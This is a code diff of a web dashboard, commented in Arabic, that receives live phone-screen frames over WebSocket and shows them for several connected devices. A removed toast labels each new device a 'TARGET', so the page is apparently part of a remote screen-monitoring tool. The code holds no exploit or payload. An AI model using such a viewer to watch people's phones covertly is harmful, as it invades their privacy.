@@ -30,7 +30,6 @@
             user-select: none;
         }
 
-        /* ─── الحاوية الرئيسية ─── */
         .app {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -39,9 +38,7 @@
             background: #000;
         }
 
-        /* ========================================
-           الشريط الجانبي الأيمن (أزرار + اسم جهاز)
-           ======================================== */
+        /* الشريط الجانبي الأيمن */
         .sidebar-right {
             width: 180px;
             background: rgba(8,8,24,0.95);
@@ -54,7 +51,6 @@
             backdrop-filter: blur(20px);
         }
 
-        /* ─── رأس الشريط ─── */
         .sidebar-header {
             text-align: center;
             padding-bottom: 12px;
@@ -77,7 +73,6 @@
             letter-spacing: 2px;
         }
 
-        /* ─── اسم الجهاز المتصل ─── */
         .device-name-box {
             padding: 10px 12px;
             background: rgba(0,240,255,0.04);
@@ -86,161 +81,44 @@
             margin-bottom: 12px;
             text-align: center;
         }
-        .device-name-box .label {
-            font-size: 8px;
-            color: #555;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-        .device-name-box .name {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 13px;
-            color: var(--neon-blue);
-            margin-top: 4px;
-            letter-spacing: 1px;
-        }
-        .device-name-box .status-line {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            margin-top: 6px;
-            font-size: 9px;
-        }
-        .device-name-box .status-line .dot {
-            width: 5px; height: 5px;
-            border-radius: 50%;
-        }
+        .device-name-box .label { font-size: 8px; color: #555; letter-spacing: 2px; text-transform: uppercase; }
+        .device-name-box .name { font-family: 'Orbitron', sans-serif; font-size: 13px; color: var(--neon-blue); margin-top: 4px; letter-spacing: 1px; }
+        .device-name-box .status-line { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; font-size: 9px; }
+        .device-name-box .status-line .dot { width: 5px; height: 5px; border-radius: 50%; }
         .device-name-box .status-line .dot.online { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
         .device-name-box .status-line .dot.offline { background: var(--neon-red); }
 
-        /* ─── قائمة الأجهزة ─── */
-        .device-scroll {
-            flex: 1;
-            overflow-y: auto;
-            margin-bottom: 10px;
-        }
+        .device-scroll { flex: 1; overflow-y: auto; margin-bottom: 10px; }
         .device-scroll::-webkit-scrollbar { width: 2px; }
         .device-scroll::-webkit-scrollbar-thumb { background: rgba(0,240,255,0.2); border-radius: 10px; }
         
-        .section-title {
-            font-size: 8px;
-            color: #444;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-bottom: 6px;
-        }
+        .section-title { font-size: 8px; color: #444; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 6px; }
         
-        .device-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 10px;
-            margin-bottom: 3px;
-            background: rgba(255,255,255,0.02);
-            border: 1px solid transparent;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 11px;
-        }
+        .device-item { display: flex; align-items: center; gap: 8px; padding: 8px 10px; margin-bottom: 3px; background: rgba(255,255,255,0.02); border: 1px solid transparent; border-radius: 6px; cursor: pointer; transition: all 0.2s; font-size: 11px; }
         .device-item:hover { background: rgba(255,255,255,0.05); }
-        .device-item.active {
-            border-color: var(--neon-green);
-            background: rgba(0,255,136,0.06);
-        }
+        .device-item.active { border-color: var(--neon-green); background: rgba(0,255,136,0.06); }
         .device-item .dev-icon { font-size: 14px; }
         .device-item .dev-id { flex: 1; font-weight: 600; color: #ccc; }
-        .device-item .dev-dot {
-            width: 5px; height: 5px;
-            border-radius: 50%;
-        }
+        .device-item .dev-dot { width: 5px; height: 5px; border-radius: 50%; }
         .device-item .dev-dot.online { background: var(--neon-green); }
         .device-item .dev-dot.offline { background: var(--neon-red); }
 
-        /* ─── الأزرار ─── */
-        .controls-section {
-            border-top: 1px solid rgba(255,255,255,0.06);
-            padding-top: 10px;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
+        .controls-section { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 10px; display: flex; flex-direction: column; gap: 6px; }
         
-        .ctrl-btn {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 9px 14px;
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 8px;
-            color: #888;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            font-weight: 600;
-        }
-        .ctrl-btn:hover { 
-            background: rgba(255,255,255,0.07); 
-            color: #fff;
-            border-color: rgba(255,255,255,0.12);
-        }
+        .ctrl-btn { display: flex; align-items: center; gap: 10px; padding: 9px 14px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; color: #888; cursor: pointer; transition: all 0.2s; font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; }
+        .ctrl-btn:hover { background: rgba(255,255,255,0.07); color: #fff; border-color: rgba(255,255,255,0.12); }
         .ctrl-btn .icon { font-size: 16px; width: 22px; text-align: center; }
-        .ctrl-btn .key {
-            font-size: 8px;
-            color: #444;
-            background: rgba(255,255,255,0.05);
-            padding: 1px 6px;
-            border-radius: 3px;
-            margin-left: auto;
-        }
-        .ctrl-btn.active {
-            border-color: var(--neon-red);
-            color: var(--neon-red);
-            background: rgba(255,0,68,0.08);
-        }
-        .ctrl-btn.primary {
-            border-color: rgba(0,240,255,0.15);
-            color: var(--neon-blue);
-        }
-        .ctrl-btn.primary:hover {
-            background: rgba(0,240,255,0.08);
-            border-color: rgba(0,240,255,0.25);
-        }
+        .ctrl-btn .key { font-size: 8px; color: #444; background: rgba(255,255,255,0.05); padding: 1px 6px; border-radius: 3px; margin-left: auto; }
+        .ctrl-btn.active { border-color: var(--neon-red); color: var(--neon-red); background: rgba(255,0,68,0.08); }
+        .ctrl-btn.primary { border-color: rgba(0,240,255,0.15); color: var(--neon-blue); }
+        .ctrl-btn.primary:hover { background: rgba(0,240,255,0.08); border-color: rgba(0,240,255,0.25); }
 
-        /* ─── إحصائيات في الأسفل ─── */
-        .sidebar-stats {
-            border-top: 1px solid rgba(255,255,255,0.06);
-            padding-top: 8px;
-            margin-top: auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4px;
-        }
-        .sidebar-stats .stat {
-            text-align: center;
-            padding: 5px;
-            background: rgba(255,255,255,0.02);
-            border-radius: 4px;
-        }
-        .sidebar-stats .stat .val {
-            display: block;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 14px;
-            color: var(--neon-blue);
-        }
-        .sidebar-stats .stat .lbl {
-            font-size: 7px;
-            color: #555;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+        .sidebar-stats { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 8px; margin-top: auto; display: grid; grid-template-columns: 1fr 1fr; gap: 4px; }
+        .sidebar-stats .stat { text-align: center; padding: 5px; background: rgba(255,255,255,0.02); border-radius: 4px; }
+        .sidebar-stats .stat .val { display: block; font-family: 'Orbitron', sans-serif; font-size: 14px; color: var(--neon-blue); }
+        .sidebar-stats .stat .lbl { font-size: 7px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* ========================================
-           منطقة الشاشة الحية (المركز)
-           ======================================== */
+        /* منطقة الشاشة الحية */
         .screen-area {
             flex: 1;
             display: flex;
@@ -252,73 +130,27 @@
             min-width: 0;
         }
 
-        /* ─── التعديل النهائي للكانفاس لملء كامل الشاشة دون فراغات سوداء ─── */
+        /* التعديل الجذري للكانفاس لضمان عدم حدوث تداخل بكسلي */
         #screenCanvas {
             display: block;
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* لملء المساحة بالكامل أفقياً وعمودياً وقص الزوائد بشكل متناسق */
-            position: absolute;
-            top: 0;
-            left: 0;
-            image-rendering: -webkit-optimize-contrast;
-            image-rendering: crisp-edges;
-        }
-
-        /* ─── شاشة الانتظار ─── */
-        .placeholder {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            text-align: center;
-            color: #222;
-            z-index: 2;
-            pointer-events: none;
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: pixelated;
         }
+
+        .placeholder { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: #222; z-index: 2; pointer-events: none; }
         .placeholder .icon { font-size: 80px; opacity: 0.3; }
         .placeholder h3 { font-size: 14px; color: #333; font-weight: 400; margin-top: 10px; }
         .placeholder h3 .highlight { color: var(--neon-blue); opacity: 0.5; }
 
-        /* ─── طبقة FPS في أعلى الشاشة ─── */
-        .screen-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            padding: 8px 14px;
-            display: flex;
-            gap: 15px;
-            font-size: 10px;
-            color: rgba(255,255,255,0.3);
-            z-index: 3;
-            pointer-events: none;
-            font-family: 'JetBrains Mono', monospace;
-        }
+        .screen-overlay { position: absolute; top: 0; left: 0; right: 0; padding: 8px 14px; display: flex; gap: 15px; font-size: 10px; color: rgba(255,255,255,0.3); z-index: 3; pointer-events: none; font-family: 'JetBrains Mono', monospace; }
         .screen-overlay .val { color: var(--neon-blue); font-weight: 700; }
 
-        /* ─── Toast ─── */
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 8px 20px;
-            background: rgba(0,240,255,0.08);
-            border: 1px solid rgba(0,240,255,0.2);
-            border-radius: 6px;
-            font-size: 11px;
-            color: var(--neon-blue);
-            display: none;
-            z-index: 9999;
-            font-family: 'JetBrains Mono', monospace;
-            backdrop-filter: blur(20px);
-            animation: fadeInUp 0.3s ease;
-        }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateX(-50%) translateY(10px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 8px 20px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); border-radius: 6px; font-size: 11px; color: var(--neon-blue); display: none; z-index: 9999; font-family: 'JetBrains Mono', monospace; backdrop-filter: blur(20px); animation: fadeInUp 0.3s ease; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateX(-50%) translateY(10px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
 
         @media (max-width: 700px) {
             .sidebar-right { width: 140px; padding: 8px; }
@@ -444,26 +276,11 @@
         
         function connect() {
             if (ws && ws.readyState === WebSocket.OPEN) return;
-            
             ws = new WebSocket(`${WS_URL}?type=viewer&viewer=${Math.random().toString(36).substring(7)}`);
             
-            ws.onopen = () => { 
-                updateConnection(true); 
-                showToast('🟢 SYSTEM ONLINE');
-            };
-            
-            ws.onmessage = (event) => { 
-                try { 
-                    handleMessage(JSON.parse(event.data)); 
-                } catch(e) {} 
-            };
-            
-            ws.onclose = () => { 
-                updateConnection(false);
-                setTimeout(connect, 3000); 
-            };
-            
-            ws.onerror = () => {};
+            ws.onopen = () => { updateConnection(true); showToast('🟢 SYSTEM ONLINE'); };
+            ws.onmessage = (event) => { try { handleMessage(JSON.parse(event.data)); } catch(e) {} };
+            ws.onclose = () => { updateConnection(false); setTimeout(connect, 3000); };
         }
 
         function handleMessage(data) {
@@ -476,7 +293,6 @@
                 case 'device_online':
                     devices[data.deviceId] = { id: data.deviceId, online: true };
                     renderDevices();
-                    showToast(`📱 TARGET: ${data.deviceId.substring(0,4).toUpperCase()}`);
                     break;
                 case 'device_offline':
                     if (devices[data.deviceId]) devices[data.deviceId].online = false;
@@ -494,15 +310,34 @@
         function renderFrame(base64Image) {
             const img = new Image();
             img.onload = () => {
-                // العودة للأبعاد الأصلية للصورة لضمان أعلى جودة ودقة وضوح للرسم الحركي
+                const container = document.getElementById('screenArea');
+                const containerWidth = container.clientWidth;
+                const containerHeight = container.clientHeight;
+
+                // الحفاظ على دقة الجودة الداخلية للكانفاس بناءً على الصورة المستقبلة
                 canvas.width = img.width;
                 canvas.height = img.height;
+
+                // حساب النسبة الرياضية للهاتف لملء الشاشة ديناميكياً بدون انضغاط بكسلي
+                const imgRatio = img.width / img.height;
+                const containerRatio = containerWidth / containerHeight;
+
+                let targetWidth, targetHeight;
+
+                // تمديد إجباري ذكي بناءً على الأبعاد لمنع تشوه المرايا اللانهائية
+                if (imgRatio > containerRatio) {
+                    targetWidth = containerWidth;
+                    targetHeight = containerWidth / imgRatio;
+                } else {
+                    targetHeight = containerHeight;
+                    targetWidth = containerHeight * imgRatio;
+                }
+
+                // تطبيق التكبير الدقيق لتغطية المساحة بالكامل
+                canvas.style.width = containerWidth + 'px';
+                canvas.style.height = containerHeight + 'px';
                 
-                canvas.style.width = '100%';
-                canvas.style.height = '100%';
-                
-                ctx.imageSmoothingEnabled = true;
-                ctx.imageSmoothingQuality = 'high';
+                ctx.imageSmoothingEnabled = false; // إلغاء التنعيم لمنع غبش النفق المكسر واظهار جودة حادة
                 ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                 
                 document.getElementById('placeholder').style.display = 'none';
@@ -517,11 +352,9 @@
             const now = Date.now();
             const elapsed = now - lastFrameTime;
             lastFrameTime = now;
-            
             const fps = Math.round(1000 / Math.max(elapsed, 1));
             fpsValues.push(fps);
             if (fpsValues.length > 20) fpsValues.shift();
-            
             const avgFps = Math.round(fpsValues.reduce((a,b)=>a+b, 0) / fpsValues.length);
             document.getElementById('fpsOverlay').textContent = avgFps;
             document.getElementById('fpsSide').textContent = avgFps;
@@ -532,15 +365,12 @@
         function renderDevices() {
             const list = document.getElementById('deviceList');
             const ids = Object.keys(devices);
-            
             document.getElementById('deviceCountSide').textContent = ids.length;
-            
             let html = `<div class="device-item ${selectedDevice === 'all' ? 'active' : ''}" onclick="selectDevice('all')" data-id="all">
                 <span class="dev-icon">🌐</span>
                 <span class="dev-id">ALL DEVICES</span>
                 <span class="dev-dot" style="background:var(--neon-blue)"></span>
             </div>`;
-            
             ids.forEach(id => {
                 const d = devices[id];
                 html += `<div class="device-item ${selectedDevice === id ? 'active' : ''}" onclick="selectDevice('${id}')" data-id="${id}">
@@ -549,84 +379,49 @@
                     <span class="dev-dot ${d.online ? 'online' : 'offline'}"></span>
                 </div>`;
             });
-            
             list.innerHTML = html;
         }
 
         function selectDevice(id) {
             selectedDevice = id;
-            document.querySelectorAll('.device-item').forEach(el => {
-                el.classList.toggle('active', el.dataset.id === id);
-            });
-            
+            document.querySelectorAll('.device-item').forEach(el => { el.classList.toggle('active', el.dataset.id === id); });
             const nameBox = document.getElementById('currentDeviceName');
             nameBox.textContent = id === 'all' ? 'ALL DEVICES' : id.substring(0,6).toUpperCase();
-            
             clearScreen();
-            showToast(`📌 SELECTED: ${nameBox.textContent}`);
         }
 
         function toggleStream() {
             streamActive = !streamActive;
             const btn = document.getElementById('streamBtn');
             const icon = btn.querySelector('.icon');
-            if (streamActive) {
-                icon.textContent = '⏹';
-                btn.className = 'ctrl-btn danger active';
-                showToast('▶ STREAM ACTIVE');
-            } else {
-                icon.textContent = '▶';
-                btn.className = 'ctrl-btn primary';
-                showToast('⏹ STREAM PAUSED');
-            }
+            if (streamActive) { icon.textContent = '⏹'; btn.className = 'ctrl-btn danger active'; } 
+            else { icon.textContent = '▶'; btn.className = 'ctrl-btn primary'; }
         }
 
         function clearScreen() {
-            canvas.width = 0;
-            canvas.height = 0;
-            canvas.style.width = '0';
-            canvas.style.height = '0';
+            canvas.width = 0; canvas.height = 0;
+            canvas.style.width = '0'; canvas.style.height = '0';
             document.getElementById('placeholder').style.display = 'block';
             frameCount = 0;
-            document.getElementById('frmOverlay').textContent = '0';
-            document.getElementById('frameCountSide').textContent = '0';
         }
 
         function toggleFullscreen() {
             const container = document.getElementById('screenArea');
             if (!document.fullscreenElement) {
-                if (container.requestFullscreen) {
-                    container.requestFullscreen();
-                } else if (container.webkitRequestFullscreen) {
-                    container.webkitRequestFullscreen();
-                } else if (container.msRequestFullscreen) {
-                    container.msRequestFullscreen();
-                }
+                if (container.requestFullscreen) container.requestFullscreen();
                 isFullscreen = true;
-                showToast('⛶ FULLSCREEN ON');
             } else {
-                if (document.exitFullscreen) {
-                    document.exitFullscreen();
-                } else if (document.webkitExitFullscreen) {
-                    document.webkitExitFullscreen();
-                } else if (document.msExitFullscreen) {
-                    document.msExitFullscreen();
-                }
+                if (document.exitFullscreen) document.exitFullscreen();
                 isFullscreen = false;
-                showToast('⛶ FULLSCREEN OFF');
             }
         }
 
         function captureStill() {
-            if (!canvas.width || !canvas.height) {
-                showToast('⚠ NO FRAME');
-                return;
-            }
+            if (!canvas.width || !canvas.height) return;
             const link = document.createElement('a');
             link.download = `nexus_${Date.now()}.jpg`;
             link.href = canvas.toDataURL('image/jpeg', 0.95);
             link.click();
-            showToast('📸 CAPTURED');
         }
 
         function updateConnection(online) {
@@ -634,13 +429,6 @@
             const text = document.getElementById('statusText');
             dot.className = `dot ${online ? 'online' : 'offline'}`;
             text.textContent = online ? 'CONNECTED' : 'DISCONNECTED';
-            
-            if (!online) {
-                document.getElementById('fpsOverlay').textContent = '--';
-                document.getElementById('fpsSide').textContent = '--';
-                document.getElementById('latOverlay').textContent = '--ms';
-                document.getElementById('latSide').textContent = '--ms';
-            }
         }
 
         function showToast(msg) {
